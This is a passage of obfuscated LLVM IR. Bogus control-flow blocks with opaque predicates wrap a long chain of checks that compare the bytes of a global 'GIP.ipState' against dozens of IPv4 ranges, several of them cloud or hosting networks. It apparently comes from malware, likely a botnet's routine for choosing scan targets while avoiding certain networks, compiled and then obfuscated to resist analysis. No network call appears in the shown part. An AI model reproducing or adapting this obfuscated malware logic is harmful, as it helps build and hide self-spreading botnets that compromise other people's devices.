; <label>:4450:                                   ; preds = %4446
  %4451 = load i32, i32* @x.65
  %4452 = load i32, i32* @y.66
  %4453 = sub i32 %4451, 1
  %4454 = mul i32 %4451, %4453
  %4455 = urem i32 %4454, 2
  %4456 = icmp eq i32 %4455, 0
  %4457 = icmp slt i32 %4452, 10
  %4458 = or i1 %4456, %4457
  br i1 %4458, label %originalBB630, label %originalBB630alteredBB

originalBB630:                                    ; preds = %originalBB630alteredBB, %4450
  %4459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4460 = zext i8 %4459 to i32
  %4461 = icmp eq i32 %4460, 58
  %4462 = load i32, i32* @x.65
  %4463 = load i32, i32* @y.66
  %4464 = sub i32 %4462, 1
  %4465 = mul i32 %4462, %4464
  %4466 = urem i32 %4465, 2
  %4467 = icmp eq i32 %4466, 0
  %4468 = icmp slt i32 %4463, 10
  %4469 = or i1 %4467, %4468
  br i1 %4469, label %originalBBpart2632, label %originalBB630alteredBB

originalBBpart2632:                               ; preds = %originalBB630
  br i1 %4461, label %4470, label %4478

; <label>:4470:                                   ; preds = %originalBBpart2632
  %4471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4472 = zext i8 %4471 to i32
  %4473 = icmp sge i32 %4472, 184
  br i1 %4473, label %4474, label %4478

; <label>:4474:                                   ; preds = %4470
  %4475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4476 = zext i8 %4475 to i32
  %4477 = icmp slt i32 %4476, 187
  br i1 %4477, label %5298, label %4478

; <label>:4478:                                   ; preds = %4474, %4470, %originalBBpart2632, %4446
  %4479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4480 = zext i8 %4479 to i32
  %4481 = icmp eq i32 %4480, 206
  br i1 %4481, label %4482, label %4494

; <label>:4482:                                   ; preds = %4478
  %4483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4484 = zext i8 %4483 to i32
  %4485 = icmp eq i32 %4484, 220
  br i1 %4485, label %4486, label %4494

; <label>:4486:                                   ; preds = %4482
  %4487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4488 = zext i8 %4487 to i32
  %4489 = icmp sge i32 %4488, 172
  br i1 %4489, label %4490, label %4494

; <label>:4490:                                   ; preds = %4486
  %4491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4492 = zext i8 %4491 to i32
  %4493 = icmp slt i32 %4492, 175
  br i1 %4493, label %5298, label %4494

; <label>:4494:                                   ; preds = %4490, %4486, %4482, %4478
  %4495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4496 = zext i8 %4495 to i32
  %4497 = icmp eq i32 %4496, 208
  br i1 %4497, label %4498, label %4558

; <label>:4498:                                   ; preds = %4494
  %4499 = load i32, i32* @x.65
  %4500 = load i32, i32* @y.66
  %4501 = sub i32 %4499, 1
  %4502 = mul i32 %4499, %4501
  %4503 = urem i32 %4502, 2
  %4504 = icmp eq i32 %4503, 0
  %4505 = icmp slt i32 %4500, 10
  %4506 = or i1 %4504, %4505
  br i1 %4506, label %originalBB634, label %originalBB634alteredBB

originalBB634:                                    ; preds = %originalBB634alteredBB, %4498
  %4507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4508 = zext i8 %4507 to i32
  %4509 = icmp eq i32 %4508, 78
  %4510 = load i32, i32* @x.65
  %4511 = load i32, i32* @y.66
  %4512 = sub i32 %4510, 1
  %4513 = mul i32 %4510, %4512
  %4514 = urem i32 %4513, 2
  %4515 = icmp eq i32 %4514, 0
  %4516 = icmp slt i32 %4511, 10
  %4517 = or i1 %4515, %4516
  br i1 %4517, label %originalBBpart2636, label %originalBB634alteredBB

originalBBpart2636:                               ; preds = %originalBB634
  br i1 %4509, label %4518, label %4558

; <label>:4518:                                   ; preds = %originalBBpart2636
  %4519 = load i32, i32* @x.65
  %4520 = load i32, i32* @y.66
  %4521 = sub i32 %4519, 1
  %4522 = mul i32 %4519, %4521
  %4523 = urem i32 %4522, 2
  %4524 = icmp eq i32 %4523, 0
  %4525 = icmp slt i32 %4520, 10
  %4526 = or i1 %4524, %4525
  br i1 %4526, label %originalBB638, label %originalBB638alteredBB

originalBB638:                                    ; preds = %originalBB638alteredBB, %4518
  %4527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4528 = zext i8 %4527 to i32
  %4529 = icmp sge i32 %4528, 40
  %4530 = load i32, i32* @x.65
  %4531 = load i32, i32* @y.66
  %4532 = sub i32 %4530, 1
  %4533 = mul i32 %4530, %4532
  %4534 = urem i32 %4533, 2
  %4535 = icmp eq i32 %4534, 0
  %4536 = icmp slt i32 %4531, 10
  %4537 = or i1 %4535, %4536
  br i1 %4537, label %originalBBpart2640, label %originalBB638alteredBB

originalBBpart2640:                               ; preds = %originalBB638
  br i1 %4529, label %4538, label %4558

; <label>:4538:                                   ; preds = %originalBBpart2640
  %4539 = load i32, i32* @x.65
  %4540 = load i32, i32* @y.66
  %4541 = sub i32 %4539, 1
  %4542 = mul i32 %4539, %4541
  %4543 = urem i32 %4542, 2
  %4544 = icmp eq i32 %4543, 0
  %4545 = icmp slt i32 %4540, 10
  %4546 = or i1 %4544, %4545
  br i1 %4546, label %originalBB642, label %originalBB642alteredBB

originalBB642:                                    ; preds = %originalBB642alteredBB, %4538
  %4547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4548 = zext i8 %4547 to i32
  %4549 = icmp slt i32 %4548, 43
  %4550 = load i32, i32* @x.65
  %4551 = load i32, i32* @y.66
  %4552 = sub i32 %4550, 1
  %4553 = mul i32 %4550, %4552
  %4554 = urem i32 %4553, 2
  %4555 = icmp eq i32 %4554, 0
  %4556 = icmp slt i32 %4551, 10
  %4557 = or i1 %4555, %4556
  br i1 %4557, label %originalBBpart2644, label %originalBB642alteredBB

originalBBpart2644:                               ; preds = %originalBB642
  br i1 %4549, label %5298, label %4558

; <label>:4558:                                   ; preds = %originalBBpart2644, %originalBBpart2640, %originalBBpart2636, %4494
  %4559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4560 = zext i8 %4559 to i32
  %4561 = icmp eq i32 %4560, 208
  br i1 %4561, label %4562, label %4590

; <label>:4562:                                   ; preds = %4558
  %4563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4564 = zext i8 %4563 to i32
  %4565 = icmp eq i32 %4564, 93
  br i1 %4565, label %4566, label %4590

; <label>:4566:                                   ; preds = %4562
  %4567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4568 = zext i8 %4567 to i32
  %4569 = icmp sge i32 %4568, 192
  br i1 %4569, label %4570, label %4590

; <label>:4570:                                   ; preds = %4566
  %4571 = load i32, i32* @x.65
  %4572 = load i32, i32* @y.66
  %4573 = sub i32 %4571, 1
  %4574 = mul i32 %4571, %4573
  %4575 = urem i32 %4574, 2
  %4576 = icmp eq i32 %4575, 0
  %4577 = icmp slt i32 %4572, 10
  %4578 = or i1 %4576, %4577
  br i1 %4578, label %originalBB646, label %originalBB646alteredBB

originalBB646:                                    ; preds = %originalBB646alteredBB, %4570
  %4579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4580 = zext i8 %4579 to i32
  %4581 = icmp slt i32 %4580, 193
  %4582 = load i32, i32* @x.65
  %4583 = load i32, i32* @y.66
  %4584 = sub i32 %4582, 1
  %4585 = mul i32 %4582, %4584
  %4586 = urem i32 %4585, 2
  %4587 = icmp eq i32 %4586, 0
  %4588 = icmp slt i32 %4583, 10
  %4589 = or i1 %4587, %4588
  br i1 %4589, label %originalBBpart2648, label %originalBB646alteredBB

originalBBpart2648:                               ; preds = %originalBB646
  br i1 %4581, label %5298, label %4590

; <label>:4590:                                   ; preds = %originalBBpart2648, %4566, %4562, %4558
  %4591 = load i32, i32* @x.65
  %4592 = load i32, i32* @y.66
  %4593 = sub i32 %4591, 1
  %4594 = mul i32 %4591, %4593
  %4595 = urem i32 %4594, 2
  %4596 = icmp eq i32 %4595, 0
  %4597 = icmp slt i32 %4592, 10
  %4598 = or i1 %4596, %4597
  br i1 %4598, label %originalBB650, label %originalBB650alteredBB

originalBB650:                                    ; preds = %originalBB650alteredBB, %4590
  %4599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4600 = zext i8 %4599 to i32
  %4601 = icmp eq i32 %4600, 66
  %4602 = load i32, i32* @x.65
  %4603 = load i32, i32* @y.66
  %4604 = sub i32 %4602, 1
  %4605 = mul i32 %4602, %4604
  %4606 = urem i32 %4605, 2
  %4607 = icmp eq i32 %4606, 0
  %4608 = icmp slt i32 %4603, 10
  %4609 = or i1 %4607, %4608
  br i1 %4609, label %originalBBpart2652, label %originalBB650alteredBB

originalBBpart2652:                               ; preds = %originalBB650
  br i1 %4601, label %4610, label %4638

; <label>:4610:                                   ; preds = %originalBBpart2652
  %4611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4612 = zext i8 %4611 to i32
  %4613 = icmp eq i32 %4612, 71
  br i1 %4613, label %4614, label %4638

; <label>:4614:                                   ; preds = %4610
  %4615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4616 = zext i8 %4615 to i32
  %4617 = icmp sge i32 %4616, 240
  br i1 %4617, label %4618, label %4638

; <label>:4618:                                   ; preds = %4614
  %4619 = load i32, i32* @x.65
  %4620 = load i32, i32* @y.66
  %4621 = sub i32 %4619, 1
  %4622 = mul i32 %4619, %4621
  %4623 = urem i32 %4622, 2
  %4624 = icmp eq i32 %4623, 0
  %4625 = icmp slt i32 %4620, 10
  %4626 = or i1 %4624, %4625
  br i1 %4626, label %originalBB654, label %originalBB654alteredBB

originalBB654:                                    ; preds = %originalBB654alteredBB, %4618
  %4627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4628 = zext i8 %4627 to i32
  %4629 = icmp slt i32 %4628, 255
  %4630 = load i32, i32* @x.65
  %4631 = load i32, i32* @y.66
  %4632 = sub i32 %4630, 1
  %4633 = mul i32 %4630, %4632
  %4634 = urem i32 %4633, 2
  %4635 = icmp eq i32 %4634, 0
  %4636 = icmp slt i32 %4631, 10
  %4637 = or i1 %4635, %4636
  br i1 %4637, label %originalBBpart2656, label %originalBB654alteredBB

originalBBpart2656:                               ; preds = %originalBB654
  br i1 %4629, label %5298, label %4638

; <label>:4638:                                   ; preds = %originalBBpart2656, %4614, %4610, %originalBBpart2652
  %4639 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4640 = zext i8 %4639 to i32
  %4641 = icmp eq i32 %4640, 98
  br i1 %4641, label %4642, label %4670

; <label>:4642:                                   ; preds = %4638
  %4643 = load i32, i32* @x.65
  %4644 = load i32, i32* @y.66
  %4645 = sub i32 %4643, 1
  %4646 = mul i32 %4643, %4645
  %4647 = urem i32 %4646, 2
  %4648 = icmp eq i32 %4647, 0
  %4649 = icmp slt i32 %4644, 10
  %4650 = or i1 %4648, %4649
  br i1 %4650, label %originalBB658, label %originalBB658alteredBB

originalBB658:                                    ; preds = %originalBB658alteredBB, %4642
  %4651 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4652 = zext i8 %4651 to i32
  %4653 = icmp eq i32 %4652, 142
  %4654 = load i32, i32* @x.65
  %4655 = load i32, i32* @y.66
  %4656 = sub i32 %4654, 1
  %4657 = mul i32 %4654, %4656
  %4658 = urem i32 %4657, 2
  %4659 = icmp eq i32 %4658, 0
  %4660 = icmp slt i32 %4655, 10
  %4661 = or i1 %4659, %4660
  br i1 %4661, label %originalBBpart2660, label %originalBB658alteredBB

originalBBpart2660:                               ; preds = %originalBB658
  br i1 %4653, label %4662, label %4670

; <label>:4662:                                   ; preds = %originalBBpart2660
  %4663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4664 = zext i8 %4663 to i32
  %4665 = icmp sge i32 %4664, 208
  br i1 %4665, label %4666, label %4670

; <label>:4666:                                   ; preds = %4662
  %4667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4668 = zext i8 %4667 to i32
  %4669 = icmp slt i32 %4668, 223
  br i1 %4669, label %5298, label %4670

; <label>:4670:                                   ; preds = %4666, %4662, %originalBBpart2660, %4638
  %4671 = load i32, i32* @x.65
  %4672 = load i32, i32* @y.66
  %4673 = sub i32 %4671, 1
  %4674 = mul i32 %4671, %4673
  %4675 = urem i32 %4674, 2
  %4676 = icmp eq i32 %4675, 0
  %4677 = icmp slt i32 %4672, 10
  %4678 = or i1 %4676, %4677
  br i1 %4678, label %originalBB662, label %originalBB662alteredBB

originalBB662:                                    ; preds = %originalBB662alteredBB, %4670
  %4679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4680 = zext i8 %4679 to i32
  %4681 = icmp eq i32 %4680, 107
  %4682 = load i32, i32* @x.65
  %4683 = load i32, i32* @y.66
  %4684 = sub i32 %4682, 1
  %4685 = mul i32 %4682, %4684
  %4686 = urem i32 %4685, 2
  %4687 = icmp eq i32 %4686, 0
  %4688 = icmp slt i32 %4683, 10
  %4689 = or i1 %4687, %4688
  br i1 %4689, label %originalBBpart2664, label %originalBB662alteredBB

originalBBpart2664:                               ; preds = %originalBB662
  br i1 %4681, label %4690, label %4698

; <label>:4690:                                   ; preds = %originalBBpart2664
  %4691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4692 = zext i8 %4691 to i32
  %4693 = icmp sge i32 %4692, 20
  br i1 %4693, label %4694, label %4698

; <label>:4694:                                   ; preds = %4690
  %4695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4696 = zext i8 %4695 to i32
  %4697 = icmp slt i32 %4696, 24
  br i1 %4697, label %5298, label %4698

; <label>:4698:                                   ; preds = %4694, %4690, %originalBBpart2664
  %4699 = load i32, i32* @x.65
  %4700 = load i32, i32* @y.66
  %4701 = sub i32 %4699, 1
  %4702 = mul i32 %4699, %4701
  %4703 = urem i32 %4702, 2
  %4704 = icmp eq i32 %4703, 0
  %4705 = icmp slt i32 %4700, 10
  %4706 = or i1 %4704, %4705
  br i1 %4706, label %originalBB666, label %originalBB666alteredBB

originalBB666:                                    ; preds = %originalBB666alteredBB, %4698
  %4707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4708 = zext i8 %4707 to i32
  %4709 = icmp eq i32 %4708, 35
  %4710 = load i32, i32* @x.65
  %4711 = load i32, i32* @y.66
  %4712 = sub i32 %4710, 1
  %4713 = mul i32 %4710, %4712
  %4714 = urem i32 %4713, 2
  %4715 = icmp eq i32 %4714, 0
  %4716 = icmp slt i32 %4711, 10
  %4717 = or i1 %4715, %4716
  br i1 %4717, label %originalBBpart2668, label %originalBB666alteredBB

originalBBpart2668:                               ; preds = %originalBB666
  br i1 %4709, label %4718, label %4726

; <label>:4718:                                   ; preds = %originalBBpart2668
  %4719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4720 = zext i8 %4719 to i32
  %4721 = icmp sge i32 %4720, 159
  br i1 %4721, label %4722, label %4726

; <label>:4722:                                   ; preds = %4718
  %4723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4724 = zext i8 %4723 to i32
  %4725 = icmp slt i32 %4724, 183
  br i1 %4725, label %5298, label %4726

; <label>:4726:                                   ; preds = %4722, %4718, %originalBBpart2668
  %4727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4728 = zext i8 %4727 to i32
  %4729 = icmp eq i32 %4728, 52
  br i1 %4729, label %4730, label %4738

; <label>:4730:                                   ; preds = %4726
  %4731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4732 = zext i8 %4731 to i32
  %4733 = icmp sge i32 %4732, 1
  br i1 %4733, label %4734, label %4738

; <label>:4734:                                   ; preds = %4730
  %4735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4736 = zext i8 %4735 to i32
  %4737 = icmp slt i32 %4736, 95
  br i1 %4737, label %5298, label %4738

; <label>:4738:                                   ; preds = %4734, %4730, %4726
  %4739 = load i32, i32* @x.65
  %4740 = load i32, i32* @y.66
  %4741 = sub i32 %4739, 1
  %4742 = mul i32 %4739, %4741
  %4743 = urem i32 %4742, 2
  %4744 = icmp eq i32 %4743, 0
  %4745 = icmp slt i32 %4740, 10
  %4746 = or i1 %4744, %4745
  br i1 %4746, label %originalBB670, label %originalBB670alteredBB

originalBB670:                                    ; preds = %originalBB670alteredBB, %4738
  %4747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4748 = zext i8 %4747 to i32
  %4749 = icmp eq i32 %4748, 52
  %4750 = load i32, i32* @x.65
  %4751 = load i32, i32* @y.66
  %4752 = sub i32 %4750, 1
  %4753 = mul i32 %4750, %4752
  %4754 = urem i32 %4753, 2
  %4755 = icmp eq i32 %4754, 0
  %4756 = icmp slt i32 %4751, 10
  %4757 = or i1 %4755, %4756
  br i1 %4757, label %originalBBpart2672, label %originalBB670alteredBB

originalBBpart2672:                               ; preds = %originalBB670
  br i1 %4749, label %4758, label %4782

; <label>:4758:                                   ; preds = %originalBBpart2672
  %4759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4760 = zext i8 %4759 to i32
  %4761 = icmp sge i32 %4760, 95
  br i1 %4761, label %4762, label %4782

; <label>:4762:                                   ; preds = %4758
  %4763 = load i32, i32* @x.65
  %4764 = load i32, i32* @y.66
  %4765 = sub i32 %4763, 1
  %4766 = mul i32 %4763, %4765
  %4767 = urem i32 %4766, 2
  %4768 = icmp eq i32 %4767, 0
  %4769 = icmp slt i32 %4764, 10
  %4770 = or i1 %4768, %4769
  br i1 %4770, label %originalBB674, label %originalBB674alteredBB

originalBB674:                                    ; preds = %originalBB674alteredBB, %4762
  %4771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4772 = zext i8 %4771 to i32
  %4773 = icmp slt i32 %4772, 255
  %4774 = load i32, i32* @x.65
  %4775 = load i32, i32* @y.66
  %4776 = sub i32 %4774, 1
  %4777 = mul i32 %4774, %4776
  %4778 = urem i32 %4777, 2
  %4779 = icmp eq i32 %4778, 0
  %4780 = icmp slt i32 %4775, 10
  %4781 = or i1 %4779, %4780
  br i1 %4781, label %originalBBpart2676, label %originalBB674alteredBB

originalBBpart2676:                               ; preds = %originalBB674
  br i1 %4773, label %5298, label %4782

; <label>:4782:                                   ; preds = %originalBBpart2676, %4758, %originalBBpart2672
  %4783 = load i32, i32* @x.65
  %4784 = load i32, i32* @y.66
  %4785 = sub i32 %4783, 1
  %4786 = mul i32 %4783, %4785
  %4787 = urem i32 %4786, 2
  %4788 = icmp eq i32 %4787, 0
  %4789 = icmp slt i32 %4784, 10
  %4790 = or i1 %4788, %4789
  br i1 %4790, label %originalBB678, label %originalBB678alteredBB

originalBB678:                                    ; preds = %originalBB678alteredBB, %4782
  %4791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4792 = zext i8 %4791 to i32
  %4793 = icmp eq i32 %4792, 54
  %4794 = load i32, i32* @x.65
  %4795 = load i32, i32* @y.66
  %4796 = sub i32 %4794, 1
  %4797 = mul i32 %4794, %4796
  %4798 = urem i32 %4797, 2
  %4799 = icmp eq i32 %4798, 0
  %4800 = icmp slt i32 %4795, 10
  %4801 = or i1 %4799, %4800
  br i1 %4801, label %originalBBpart2680, label %originalBB678alteredBB

originalBBpart2680:                               ; preds = %originalBB678
  br i1 %4793, label %4802, label %4810

; <label>:4802:                                   ; preds = %originalBBpart2680
  %4803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4804 = zext i8 %4803 to i32
  %4805 = icmp sge i32 %4804, 64
  br i1 %4805, label %4806, label %4810

; <label>:4806:                                   ; preds = %4802
  %4807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4808 = zext i8 %4807 to i32
  %4809 = icmp slt i32 %4808, 95
  br i1 %4809, label %5298, label %4810

; <label>:4810:                                   ; preds = %4806, %4802, %originalBBpart2680
  %4811 = load i32, i32* @x.65
  %4812 = load i32, i32* @y.66
  %4813 = sub i32 %4811, 1
  %4814 = mul i32 %4811, %4813
  %4815 = urem i32 %4814, 2
  %4816 = icmp eq i32 %4815, 0
  %4817 = icmp slt i32 %4812, 10
  %4818 = or i1 %4816, %4817
  br i1 %4818, label %originalBB682, label %originalBB682alteredBB

originalBB682:                                    ; preds = %originalBB682alteredBB, %4810
  %4819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4820 = zext i8 %4819 to i32
  %4821 = icmp eq i32 %4820, 54
  %4822 = load i32, i32* @x.65
  %4823 = load i32, i32* @y.66
  %4824 = sub i32 %4822, 1
  %4825 = mul i32 %4822, %4824
  %4826 = urem i32 %4825, 2
  %4827 = icmp eq i32 %4826, 0
  %4828 = icmp slt i32 %4823, 10
  %4829 = or i1 %4827, %4828
  br i1 %4829, label %originalBBpart2684, label %originalBB682alteredBB

originalBBpart2684:                               ; preds = %originalBB682
  br i1 %4821, label %4830, label %4838

; <label>:4830:                                   ; preds = %originalBBpart2684
  %4831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4832 = zext i8 %4831 to i32
  %4833 = icmp sge i32 %4832, 144
  br i1 %4833, label %4834, label %4838

; <label>:4834:                                   ; preds = %4830
  %4835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4836 = zext i8 %4835 to i32
  %4837 = icmp slt i32 %4836, 255
  br i1 %4837, label %5298, label %4838

; <label>:4838:                                   ; preds = %4834, %4830, %originalBBpart2684
  %4839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4840 = zext i8 %4839 to i32
  %4841 = icmp eq i32 %4840, 13
  br i1 %4841, label %4842, label %4850

; <label>:4842:                                   ; preds = %4838
  %4843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4844 = zext i8 %4843 to i32
  %4845 = icmp sge i32 %4844, 52
  br i1 %4845, label %4846, label %4850

; <label>:4846:                                   ; preds = %4842
  %4847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4848 = zext i8 %4847 to i32
  %4849 = icmp slt i32 %4848, 60
  br i1 %4849, label %5298, label %4850

; <label>:4850:                                   ; preds = %4846, %4842, %4838
  %4851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4852 = zext i8 %4851 to i32
  %4853 = icmp eq i32 %4852, 13
  br i1 %4853, label %4854, label %4862

; <label>:4854:                                   ; preds = %4850
  %4855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4856 = zext i8 %4855 to i32
  %4857 = icmp sge i32 %4856, 112
  br i1 %4857, label %4858, label %4862

; <label>:4858:                                   ; preds = %4854
  %4859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4860 = zext i8 %4859 to i32
  %4861 = icmp slt i32 %4860, 115
  br i1 %4861, label %5298, label %4862

; <label>:4862:                                   ; preds = %4858, %4854, %4850
  %4863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4864 = zext i8 %4863 to i32
  %4865 = icmp eq i32 %4864, 163
  br i1 %4865, label %4866, label %4870

; <label>:4866:                                   ; preds = %4862
  %4867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4868 = zext i8 %4867 to i32
  %4869 = icmp eq i32 %4868, 172
  br i1 %4869, label %5298, label %4870

; <label>:4870:                                   ; preds = %4866, %4862
  %4871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4872 = zext i8 %4871 to i32
  %4873 = icmp eq i32 %4872, 51
  br i1 %4873, label %4874, label %4914

; <label>:4874:                                   ; preds = %4870
  %4875 = load i32, i32* @x.65
  %4876 = load i32, i32* @y.66
  %4877 = sub i32 %4875, 1
  %4878 = mul i32 %4875, %4877
  %4879 = urem i32 %4878, 2
  %4880 = icmp eq i32 %4879, 0
  %4881 = icmp slt i32 %4876, 10
  %4882 = or i1 %4880, %4881
  br i1 %4882, label %originalBB686, label %originalBB686alteredBB

originalBB686:                                    ; preds = %originalBB686alteredBB, %4874
  %4883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4884 = zext i8 %4883 to i32
  %4885 = icmp sge i32 %4884, 15
  %4886 = load i32, i32* @x.65
  %4887 = load i32, i32* @y.66
  %4888 = sub i32 %4886, 1
  %4889 = mul i32 %4886, %4888
  %4890 = urem i32 %4889, 2
  %4891 = icmp eq i32 %4890, 0
  %4892 = icmp slt i32 %4887, 10
  %4893 = or i1 %4891, %4892
  br i1 %4893, label %originalBBpart2688, label %originalBB686alteredBB

originalBBpart2688:                               ; preds = %originalBB686
  br i1 %4885, label %4894, label %4914

; <label>:4894:                                   ; preds = %originalBBpart2688
  %4895 = load i32, i32* @x.65
  %4896 = load i32, i32* @y.66
  %4897 = sub i32 %4895, 1
  %4898 = mul i32 %4895, %4897
  %4899 = urem i32 %4898, 2
  %4900 = icmp eq i32 %4899, 0
  %4901 = icmp slt i32 %4896, 10
  %4902 = or i1 %4900, %4901
  br i1 %4902, label %originalBB690, label %originalBB690alteredBB

originalBB690:                                    ; preds = %originalBB690alteredBB, %4894
  %4903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4904 = zext i8 %4903 to i32
  %4905 = icmp slt i32 %4904, 255
  %4906 = load i32, i32* @x.65
  %4907 = load i32, i32* @y.66
  %4908 = sub i32 %4906, 1
  %4909 = mul i32 %4906, %4908
  %4910 = urem i32 %4909, 2
  %4911 = icmp eq i32 %4910, 0
  %4912 = icmp slt i32 %4907, 10
  %4913 = or i1 %4911, %4912
  br i1 %4913, label %originalBBpart2692, label %originalBB690alteredBB

originalBBpart2692:                               ; preds = %originalBB690
  br i1 %4905, label %5298, label %4914

; <label>:4914:                                   ; preds = %originalBBpart2692, %originalBBpart2688, %4870
  %4915 = load i32, i32* @x.65
  %4916 = load i32, i32* @y.66
  %4917 = sub i32 %4915, 1
  %4918 = mul i32 %4915, %4917
  %4919 = urem i32 %4918, 2
  %4920 = icmp eq i32 %4919, 0
  %4921 = icmp slt i32 %4916, 10
  %4922 = or i1 %4920, %4921
  br i1 %4922, label %originalBB694, label %originalBB694alteredBB

originalBB694:                                    ; preds = %originalBB694alteredBB, %4914
  %4923 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4924 = zext i8 %4923 to i32
  %4925 = icmp eq i32 %4924, 79
  %4926 = load i32, i32* @x.65
  %4927 = load i32, i32* @y.66
  %4928 = sub i32 %4926, 1
  %4929 = mul i32 %4926, %4928
  %4930 = urem i32 %4929, 2
  %4931 = icmp eq i32 %4930, 0
  %4932 = icmp slt i32 %4927, 10
  %4933 = or i1 %4931, %4932
  br i1 %4933, label %originalBBpart2696, label %originalBB694alteredBB

originalBBpart2696:                               ; preds = %originalBB694
  br i1 %4925, label %4934, label %4946

; <label>:4934:                                   ; preds = %originalBBpart2696
  %4935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4936 = zext i8 %4935 to i32
  %4937 = icmp eq i32 %4936, 121
  br i1 %4937, label %4938, label %4946

